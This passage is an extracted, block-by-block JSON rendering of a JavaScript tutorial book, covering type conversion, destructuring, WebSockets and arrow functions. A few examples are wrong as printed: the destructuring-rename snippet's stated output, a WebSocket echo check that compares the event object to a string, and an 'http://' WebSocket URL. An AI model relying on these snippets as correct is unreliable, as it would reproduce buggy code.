        "text": "\"2.4\" (numeric) 2.4 true \"test\" (non numeric NaN true \"0\" 0 true \"1\" 1 true -0 \"0\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "false 0 \"0\"",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "false 1 \"1\" true In\ufb01nity \"In\ufb01nity\" true -In\ufb01nity \"-In\ufb01nity\" true [] \"\" 0 true [3] \"3\" 3 true ['a'] \"a\" NaN true ['a','b'] \"a,b\" NaN true { } \"[object Object]\" NaN true function(){} \"function(){}\" NaN true Bold values highlight conversion that programmers may \ufb01nd surprising To convert explicitly values you can use String() Number() Boolean()",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.7: Convert an array to a string",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Array. join ( separator )  can be used to output an array as a string, with a con\ufb01gurable separator. Default (separator = \",\"):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ \"a\" ,   \"b\" ,   \"c\" ] . join ()   ===   \"a,b,c\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 329",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "With a string separator:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ,   2 ,   3 ,   4 ] . join ( \" + \" )   ===   \"1 + 2 + 3 + 4\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With a blank separator:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ \"B\" ,   \"o\" ,   \"b\" ] . join ( \"\" )   ===   \"Bob\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 59.8: Array to String using array methods",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "This way may seem to be useless because you are using anonymous function to accomplish something that you can do it with join(); But if you need to make something to the strings while you are converting the Array to String, this can be useful.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var   arr  =   [ 'a' ,   ' \u00e1 ' ,   'b' ,   'c' ] function  upper_lower  ( a ,  b ,  i )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   //...do something here",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  b  =  i  &   1   ?  b. toUpperCase ()   :  b. toLowerCase ();    return  a  +   ','   +  b } arr  =  arr. reduce ( upper_lower );   // \"a, \u00c1 ,b,C\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 59.9: Converting a number to a boolean",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Boolean ( 0 )   ===   false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Boolean ( 0 )  will convert the number  0  into a boolean  false . A shorter, but less clear, form:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "!! 0   ===   false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 59.10: Converting a string to a boolean",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To convert a string to boolean use",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Boolean ( myString )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "or the shorter but less clear form",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "!! myString",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "All strings except the empty string (of length zero) are evaluated to  true  as booleans.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Boolean ( '' )   ===   false     // is true Boolean ( \"\" )   ===   false     // is true Boolean ( '0' )   ===   false    // is false Boolean ( 'any_nonempty_string' )   ===   true   // is true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 59.11: Integer to Float",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In JavaScript, all numbers are internally represented as \ufb02oats. This means that simply using your integer as a \ufb02oat is",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 330",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "all that must be done to convert it.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.12: Float to Integer",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To convert a \ufb02oat to an integer, JavaScript provides multiple methods. The  floor  function returns the \ufb01rst integer less than or equal to the \ufb02oat.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. floor ( 5.7 );   // 5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  ceil  function returns the \ufb01rst integer greater than or equal to the \ufb02oat.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. ceil ( 5.3 );   // 6",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  round  function rounds the \ufb02oat.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. round ( 3.2 );   // 3 Math. round ( 3.6 );   // 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Truncation ( trunc ) removes the decimals from the \ufb02oat.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. trunc ( 3.7 );   // 3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Notice the di\ufb00erence between truncation ( trunc ) and  floor :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. floor (- 3.1 );   // -4 Math. trunc (- 3.1 );   // -3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 59.13: Convert string to \ufb02oat",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "parseFloat  accepts a string as an argument which it converts to a \ufb02oat/",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "parseFloat ( \"10.01\" )   // = 10.01",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 331",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 60: Destructuring assignment",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Destructuring is a  pattern matching  technique that is added to JavaScript recently in ECMAScript 6. It allows you to bind a group of variables to a corresponding set of values when their pattern matches to the right hand-side and the left hand-side of the expression.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 60.1: Destructuring Objects",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Destructuring is a convenient way to extract properties from objects into variables. Basic syntax:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  person  =   {   name :   'Bob' ,   age :   25 }; let   {  name ,  age  }   =  person ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Is equivalent to",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  name  =  person. name ;   // 'Bob' let  age  =  person. age ;     // 25",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Destructuring and renaming:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  person  =   {   name :   'Bob' ,   age :   25 }; let   {  name :  firstName  }   =  person ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Is equivalent to",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  firstName  =  person. name ;   // 'Bob'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Destructuring with default values:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  person  =   {   name :   'Bob' ,   age :   25 }; let   {  phone  =   '123-456-789'   }   =  person ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Is equivalent to",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  phone  =  person. hasOwnProperty ( 'phone' )   ?  person. phone   :   '123-456-789' ;   // '123-456-789'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Destructuring and renaming with default values",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  person  =   {   name :   'Bob' ,   age :   25 }; let   {  phone :  p  =   '123-456-789'   }   =  person ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 332",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Is equivalent to",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  p  =  person. hasOwnProperty ( 'phone' )   ?  person. phone   :   '123-456-789' ;   // '123-456-789'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 60.2: Destructuring function arguments",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Pull properties from an object passed into a function. This pattern simulates named parameters instead of relying on argument position.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  user  =   {     name :   'Jill' ,     age :   33 ,     profession :   'Pilot' }      function  greeting  ({ name ,  profession })   {     console. log ( `Hello ,  $ { name }  the $ { profession } ` ) } greeting ( user )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This also works for arrays:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  parts  =   [ \"Hello\" ,   \"World!\" ]; function  greeting ([ first ,  second ])   {     console. log ( `$ { first }  $ { second } ` ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 60.3: Nested Destructuring",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "We are not limited to destructuring an object/array, we can destructure a nested object/array.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Nested Object Destructuring",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {   a :   {     c :   1 ,     d :   3    },   b :   2 };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  a :   {     c :  x ,     d :  y    },   b :  z }   =  obj ; console. log ( x ,  y ,  z );       // 1,3,2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Nested Array Destructuring",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr  =   [ 1 ,   2 ,   [ 3 ,   4 ],   5 ]; var   [ a ,   ,   [ b ,  c ],  d ]   =  arr ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 333",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( a ,  b ,  c ,  d );        // 1 3 4 5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Destructuring is not just limited to a single pattern, we can have arrays in it, with n-levels of nesting. Similarly we can destructure arrays with objects and vice-versa.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Arrays Within Object",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {   a :   1 ,   b :   [ 2 ,   3 ] };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  a :  x1 ,   b :   [ x2 ,  x3 ] }   =  obj ; console. log ( x1 ,  x2 ,  x3 );      // 1 2 3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Objects Within Arrays",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr  =   [ 1 ,   2   ,   { a  :   3 },   4 ]; var   [ x1 ,  x2  ,   { a  :  x3 },  x4 ]   =  arr ; console. log ( x1 ,  x2 ,  x3 ,  x4 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 60.4: Destructuring Arrays",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "const  myArr  =   [ 'one' ,   'two' ,   'three' ] const   [  a ,  b ,  c  ]   =  myArr",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// a = 'one', b = 'two, c = 'three'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We can set default value in destructuring array, see the example of Default Value While Destructuring. With destructuring array, we can swap the values of 2 variables easily:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   1 ; var  b  =   3 ; [ a ,  b ]   =   [ b ,  a ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// a = 3, b = 1",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We can specify empty slots to skip unneeded values:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ a ,   ,  b ]   =   [ 1 ,   2 ,   3 ]   // a = 1, b = 3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 60.5: Destructuring inside variables",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Aside from destructuring objects into function arguments, you can use them inside variable declarations as follows:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  person  =   {   name :   'John Doe' ,   age :   45 ,   location :   'Paris, France' , };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 334",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let   {  name ,  age ,  location  }   =  person ; console. log ( 'I am '   +  name  +   ', aged '   +  age  +   ' and living in '   +  location  +   '.' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// -> \"I am John Doe aged 45 and living in Paris, France.\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "As you can see, three new variables were created:  name ,  age  and  location  and their values were grabbed from the object  person  if they matched key names.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 60.6: Default Value While Destructuring",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "We often encounter a situation where a property we're trying to extract doesn't exist in the object/array, resulting in a  TypeError  (while destructuring nested objects) or being set to  undefined . While destructuring we can set a default value, which it will fallback to, in case of it not being found in the object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   { a  :   1 }; var   { a  :  x  ,  b  :  x1  =   10 }   =  obj ; console. log ( x ,  x1 );   // 1, 10   var  arr  =   []; var   [ a  =   5 ,  b  =   10 ,  c ]   =  arr ; console. log ( a ,  b ,  c );   // 5, 10, undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 60.7: Renaming Variables While Destructuring",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Destructuring allows us to refer to one key in an object, but declare it as a variable with a di\ufb00erent name. The syntax looks like the key-value syntax for a normal JavaScript object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  user  =   {   name :   'John Smith' ,   id :   10 ,   email :   'johns@workcorp.com' , }; let   { user :  userName ,  id :  userId }   =  user ; console. log ( userName )   // John Smith console. log ( userId )   // 10",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 335",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 61: WebSockets",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Parameter Details url",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The server url supporting this web socket connection. data The content to send to the host. message The message received from the host. WebSocket is protocol, which enables two-way communication between a client and server: The goal WebSocket is to provide a mechanism for browser-based applications that need two-way communication with servers that does not rely on opening multiple HTTP connections. ( RFC 6455 ) WebSocket works over HTTP protocol.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 61.1: Working with string messages",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  wsHost  =   \"ws://my-sites-url.com/path/to/echo-web-socket-handler\" ; var  ws  =   new  WebSocket ( wsHost ); var  value  =   \"an example message\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//onmessage : Event Listener - Triggered when we receive message form server",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "ws. onmessage   =   function ( message )   {      if   ( message  ===  value )   {         console. log ( \"The echo host sent the correct message.\" );      }   else   {         console. log ( \"Expected: \"   +  value );         console. log ( \"Received: \"   +  message );      } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//onopen : Event Listener - event is triggered when websockets readyState changes to open which means now we are ready to send and receives messages from server",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "ws. onopen   =   function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     //send is used to send the message to server",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    ws. send ( value ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 61.2: Establish a web socket connection",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  wsHost  =   \"ws://my-sites-url.com/path/to/web-socket-handler\" ; var  ws  =   new  WebSocket ( wsHost );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 61.3: Working with binary messages",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  wsHost  =   \"http://my-sites-url.com/path/to/echo-web-socket-handler\" ; var  ws  =   new  WebSocket ( wsHost ); var  buffer  =   new  ArrayBuffer ( 5 );   // 5 byte buffer var  bufferView  =   new  DataView ( buffer ); bufferView. setFloat32 ( 0 ,  Math. PI ); bufferView. setUint8 ( 4 ,   127 ); ws. binaryType   =   'arraybuffer' ; ws. onmessage   =   function ( message )   {      var  view  =   new  DataView ( message. data );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 336",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    console. log ( 'Uint8:' ,  view. getUint8 ( 4 ),   'Float32:' ,  view. getFloat32 ( 0 )) }; ws. onopen   =   function ()   {     ws. send ( buffer ); };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 61.4: Making a secure web socket connection",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  sck  =   \"wss://site.com/wss-handler\" ; var  wss  =   new  WebSocket ( sck );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This uses the  wss  instead of  ws  to make a secure web socket connection which make use of HTTPS instead of HTTP",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 337",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 62: Arrow Functions",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Arrow functions are a concise way of writing anonymous, lexically scoped functions in  ECMAScript 2015 (ES6) .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 62.1: Introduction",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In JavaScript, functions may be anonymously de\ufb01ned using the \"arrow\" ( => ) syntax, which is sometimes referred to as a  lambda expression  due to Common Lisp similarities. The simplest form of an arrow function has its arguments on the left side of  =>  and the return value on the right side:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "item  =>  item  +   1   // -> function(item){return item + 1}",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This function can be immediately invoked by providing an argument to the expression:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( item  =>  item  +   1 )( 41 )   // -> 42",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If an arrow function takes a single parameter, the parentheses around that parameter are optional. For example, the following expressions assign the same type of function into constant variables:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  foo  =  bar  =>  bar  +   1 ; const  bar  =   ( baz )   =>  baz  +   1 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However, if the arrow function takes no parameters, or more than one parameter, a new set of parentheses  must encase all the arguments:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "(()   =>   \"foo\" )()   // -> \"foo\" (( bow ,  arrow )   =>  bow  +  arrow )( 'I took an arrow ' ,   'to the knee...' )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// -> \"I took an arrow to the knee...\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If the function body doesn't consist of a single expression, it must be surrounded by brackets and use an explicit return  statement for providing a result:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( bar  =>   {    const  baz  =   41 ;    return  bar  +  baz ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "})( 1 );   // -> 42",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If the arrow function's body consists only of an object literal, this object literal has to be enclosed in parentheses:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( bar  =>   ({  baz :   1   }))();   // -> Object {baz: 1}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The extra parentheses indicate that the opening and closing brackets are part of the object literal, i.e. they are not delimiters of the function body.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 62.2: Lexical Scoping & Binding (Value of \"this\")",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Arrow functions are  lexically scoped ; this means that their  this  Binding is bound to the context of the surrounding scope. That is to say, whatever  this  refers to can be preserved by using an arrow function. Take a look at the following example. The class  Cow  has a method that allows for it to print out the sound it makes",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 338",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "after 1 second.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  Cow  {   constructor ()   {      this . sound   =   \"moo\" ;    }   makeSoundLater ()   {     setTimeout (()   =>  console. log ( this . sound ),   1000 );    } } const  betsy  =   new  Cow (); betsy. makeSoundLater ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the  makeSoundLater ()  method, the  this  context refers to the current instance of the  Cow  object, so in the case where I call  betsy. makeSoundLater () , the  this  context refers to  betsy . By using the arrow function, I  preserve  the  this  context so that I can make reference to  this . sound  when it comes time to print it out, which will properly print out \"moo\". If you had used a regular function in place of the arrow function, you would lose the context of being within the class, and not be able to directly access the  sound  property.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 62.3: Arguments Object",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Arrow functions do not expose an arguments object; therefore,  arguments  would simply refer to a variable in the current scope.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  arguments  =   [ true ]; const  foo  =  x  =>  console. log ( arguments [ 0 ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo ( false );   // -> true",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Due to this, arrow functions are also  not  aware of their caller/callee. While the lack of an arguments object can be a limitation in some edge cases, rest parameters are generally a suitable alternative.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  arguments  =   [ true ]; const  foo  =   ( ... arguments )   =>  console. log ( arguments [ 0 ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo ( false );   // -> false",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 62.4: Implicit Return",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Arrow functions may implicitly return values by simply omitting the curly braces that traditionally wrap a function's body if their body only contains a single expression.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  foo  =  x  =>  x  +   1 ; foo ( 1 );   // -> 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When using implicit returns, object literals must be wrapped in parenthesis so that the curly braces are not mistaken for the opening of the function's body.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 339",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  foo  =   ()   =>   {  bar :   1   }   // foo() returns undefined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  foo  =   ()   =>   ({  bar :   1   })   // foo() returns {bar: 1}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 62.5: Arrow functions as a constructor",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Arrow functions will throw a  TypeError  when used with the  new  keyword.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  foo  =   function   ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   'foo' ; } const  a  =   new  foo (); const  bar  =   ()   =>   {    return   'bar' ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "const  b  =   new  bar ();   // -> Uncaught TypeError: bar is not a constructor...",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 62.6: Explicit Return",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Arrow functions can behave very similar to classic functions in that you may explicitly return a value from them using the  return  keyword; simply wrap your function's body in curly braces, and return a value:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  foo  =  x  =>   {    return  x  +   1 ; } foo ( 1 );   // -> 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 340",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
